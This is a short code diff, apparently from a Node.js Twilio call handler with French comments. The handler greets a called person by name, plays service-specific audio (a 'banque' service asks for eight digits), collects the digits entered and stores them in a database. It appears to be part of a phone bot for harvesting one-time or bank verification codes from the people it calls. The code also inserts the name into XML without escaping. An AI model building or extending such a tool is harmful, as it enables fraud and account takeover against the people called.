@@ -34,9 +34,8 @@ module.exports = function(request, response) {
          * Au cas où le callSid n'est pas trouvé, on utilise l'audio par défaut
          * Pareil pour le nom de la personne à appeler
          */
-        const service = row == undefined ? 'default' : row.service;
-        console.log(row.name);
-        const name = row.name == null ? '' : row.name;
+        var service = row == undefined ? 'default' : row.service;
+        var name = row.name == null ? '' : row.name;
         
 
         /**
@@ -46,15 +45,15 @@ module.exports = function(request, response) {
         /**
          * L'on crée ici les url des audios grâce aux données dans le fichier config
          */
-        const endurl = config.serverurl + '/stream/end';
-        const askurl = config.serverurl + '/stream/' + service;
-        const numdigits = service == 'banque' ? '8' : '6';
+        var endurl = config.serverurl + '/stream/end';
+        var askurl = config.serverurl + '/stream/' + service;
+        var numdigits = service == 'banque' ? '8' : '6';
 
         /**
          * Ici l'on crée la réponse TwiML à renvoyer, en y ajoutant l'url de l'audio
          */
-        const end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
-        const ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="' + numdigits + '"><Say>Bonjour ' + name + ',</Say><Play loop="4">' + askurl + '</Play></Gather></Response>';
+        var end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
+        var ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="' + numdigits + '"><Say>Bonjour ' + name + ',</Say><Play loop="4">' + askurl + '</Play></Gather></Response>';
 
         /**
          * Si l'utilisateur à envoyé le code, alors l'ajouter à la base de donnée et renvoyer l'audio de fin : fin de l'appel
